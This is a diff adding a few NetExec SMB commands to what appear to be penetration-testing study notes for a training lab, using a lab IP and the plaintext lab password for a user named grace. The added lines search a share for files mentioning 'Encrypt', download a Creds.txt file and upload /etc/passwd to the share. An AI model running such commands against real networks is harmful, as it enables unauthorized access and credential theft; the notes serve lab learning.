@@ -117,4 +117,18 @@ $  nxc smb 10.129.203.121 -u grace -p Inlanefreight01! --spider IT --pattern txt
 ```
 %%  spider to further enumerate shares and regex or pattern option for searching for files on the shares %%
 
+```
+$ nxc smb 10.129.203.121 -u grace -p Inlanefreight01! --spider IT --content --regex Encrypt
+```
+%% find a file containing word encrypt %%
+
+```
+$ nxc smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --get-file Creds.txt Creds.txt
+```
+%% retrieve a file in a shared folder %%
+
+```
+$ nxc smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --put-file /etc/passwd passwd
+```
+%% add file to a shared folder %%
 
